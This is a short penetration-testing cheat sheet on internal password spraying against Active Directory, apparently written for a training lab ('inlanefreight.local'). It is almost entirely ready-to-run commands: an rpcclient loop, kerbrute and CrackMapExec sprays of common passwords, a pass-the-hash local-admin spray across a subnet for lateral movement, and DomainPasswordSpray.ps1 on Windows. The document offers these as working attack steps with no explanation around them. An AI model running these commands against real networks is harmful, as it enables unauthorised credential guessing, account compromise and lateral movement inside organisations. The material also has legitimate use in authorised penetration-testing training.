# Internal Password Spraying

## From Linux

### Using a Bash one-liner for the Attack

{% code overflow="wrap" %}
```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" $IP | grep Authority; done
```
{% endcode %}

### Kerbrute

{% code overflow="wrap" %}
```bash
kerbrute passwordspray -d inlanefreight.local --dc $IP valid_users.txt  Welcome1
```
{% endcode %}

### Using CrackMapExec & Filtering Logon Failures

```bash
sudo crackmapexec smb $IP -u valid_users.txt -p Password123 | grep +
```

### Local Admin Spraying with CrackMapExec for lateral movement

{% code overflow="wrap" %}
```bash
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```
{% endcode %}

***

## From Windows

### Using DomainPasswordSpray.ps1

```powershell
Import-Module .\DomainPasswordSpray.ps1
```

{% code overflow="wrap" %}
```powershell
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```
{% endcode %}
